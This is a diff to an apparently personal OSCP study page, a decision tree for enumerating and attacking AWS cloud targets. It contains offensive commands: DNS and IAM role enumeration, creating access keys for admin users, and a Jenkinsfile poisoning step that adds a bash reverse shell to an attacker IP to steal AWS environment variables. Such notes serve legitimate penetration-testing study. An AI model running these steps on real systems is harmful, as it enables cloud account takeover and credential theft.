@@ -9,24 +9,24 @@ Part of [[DECISION TREE]]. "I found X, what do I try" lookup for AWS cloud enume
 ## I know the target domain and suspect cloud hosting
 
 ```
-host -t ns <domain>
+host -t ns $Domain
         │
         ├── awsdns-*.co.uk/net/com/org → Route53 (AWS)
-        │       └── host www.<domain> → check IP
-        │                   └── host <ip> → ec2-* PTR → confirmed EC2
+        │       └── host www.$Domain → check IP
+        │                   └── host $BoxIP → ec2-* PTR → confirmed EC2
         │
         ├── azure-dns.com → Azure
         └── ns-cloud-*.googledomains.com → GCP
 
 On Route53 confirmed:
-    └── dig TXT <domain> @<dns_ip>
+    └── dig TXT $Domain @$BoxIP
             └── non-standard string in SPF/TXT record → potential flag/data hidden there
 
-    └── dnsenum <domain> --threads 100
+    └── dnsenum $Domain --threads 100
             └── zone transfer fails (expected on Route53)
             └── subdomains discovered via brute force → enumerate each
 
-    └── browse www.<domain> → DevTools Network tab
+    └── browse www.$Domain → DevTools Network tab
             └── filter s3.amazonaws.com requests
             └── extract bucket name from URL
 ```
@@ -78,7 +78,7 @@ Do I have a known public resource (AMI/snapshot/S3 bucket) from the target?
         └── I want to enumerate IAM users/roles cross-account
                 └── Use IAM trust policy oracle (Pacu iam__enum_roles)
                         pacu → import_keys <attacker_profile>
-                        run iam__enum_roles --account-id <target_acct> --word-list /tmp/names.txt
+                        run iam__enum_roles --account-id $BoxName --word-list /tmp/names.txt
                         MalformedPolicy = doesn't exist
                         Success + credentials = exists AND assumable
 ```
@@ -117,7 +117,7 @@ Reduce noise / evade logging:
 ```
 iam:CreateAccessKey on Resource:*
         → CreateAccessKey for any user (including admins)
-        → aws iam create-access-key --user-name <admin-user> --profile <compromised>
+        → aws iam create-access-key --user-name $Username --profile <compromised>
         → configure new profile with those keys → full admin
 
 iam:CreateLoginProfile / iam:UpdateLoginProfile on Resource:*
@@ -245,7 +245,7 @@ Download terraform.tfstate
 ```
 python3 -c "
 import sqlite3
-c = sqlite3.connect('<path/to/db.db>')
+c = sqlite3.connect('$BoxDir')
 print([t[0] for t in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")])
 print(c.execute('SELECT * FROM <table>').fetchall())
 "
@@ -286,7 +286,7 @@ Browse private repos → look for Jenkinsfile / .gitlab-ci.yml / .github/workflo
 
 Can you edit the Jenkinsfile?
     YES → Poisoned Pipeline Execution (PPE)
-        → Add sh 'bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1" &' inside withAWS block
+        → Add sh 'bash -c "bash -i >& /dev/tcp/$BoxIP/$Port 0>&1" &' inside withAWS block
         → Commit → webhook fires → Jenkins builds → reverse shell with AWS env vars
     NO → Can you fork and submit a PR? → Indirect PPE (PR triggers pipeline)
 ```
@@ -327,3 +327,14 @@ cat /proc/mounts | head -3
 - [RevShells](https://www.revshells.com/) for shell troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for transformations
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/06. Information Gathering]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
